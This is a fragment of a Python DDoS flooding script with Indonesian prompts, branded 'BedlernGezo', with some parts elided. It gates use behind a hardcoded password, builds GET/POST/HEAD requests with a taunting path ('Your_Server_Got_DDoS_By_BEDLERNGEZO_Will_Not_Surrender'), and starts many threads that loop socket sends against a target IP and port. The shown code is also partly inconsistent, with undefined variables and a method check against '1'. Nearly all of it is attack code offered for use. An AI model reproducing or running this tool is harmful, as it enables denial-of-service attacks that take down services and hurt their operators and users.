...
if password == "BedlernGezo":
    print("\033[55mcorrect password")
    time.sleep(2)
else :
    print("\033[44mPassword Salah")
...
time.sleep(1)
print("\033[44m━━━[+] Masukan Methode [get/post/head]")
method_attack = str(input("┗━━━━━━>\033[0m:"))
time.sleep(1)
...
def Headers(method, referers=None):
    ...
    if method == "get" or method == "head":
        post_host = "POST /Your_Server_Got_DDoS_By_BEDLERNGEZO_Will_Not_Surrender HTTP/1.1\r\nHost: " + ip + "\r\n"
...
os.system('color ' +random.choice(['B'])+ " & cls & title Tools DDoS Used By BedlernGezo [ DDoS Attack ]")
def Gezo():
    header = Headers("get")
    i = random.choice(("[*]","[!]","[#]"))
    data = random._urandom(2022)
    if method_attack == "1":
        get_host = "GET /Your_Server_Got_DDoS_By_BEDLERNGEZO_Will_Not_Surrender HTTP/1.1\r\nHost: " + ip + "\r\n"
        request  = get_host + header + "\r\n"
    else:
        get_host = random.choice(['GET','POST','HEAD']) + " /Your_Server_Got_DDoS_By_BEDLERNGEZO_Will_NoSurrender HTTP/1.1\r\nHost: " + ip + "\r\n"
        request  = get_host + header + "\r\n"
    while True:
        try:
            ...
            for x in range(time):
                ...
                s.sendall(str.encode(request))
                s.sendall(str.encode(request))
            print("[ + ] Send Packet to => ",ip," Port => ",port,"!")
        except socket.error:
            s.close()
            print("[ + ] Send Packet to => ",ip," Port => ",port,"!")
...
for y in range(threads):
    th = threading.Thread(target = Gezo)
    th.start()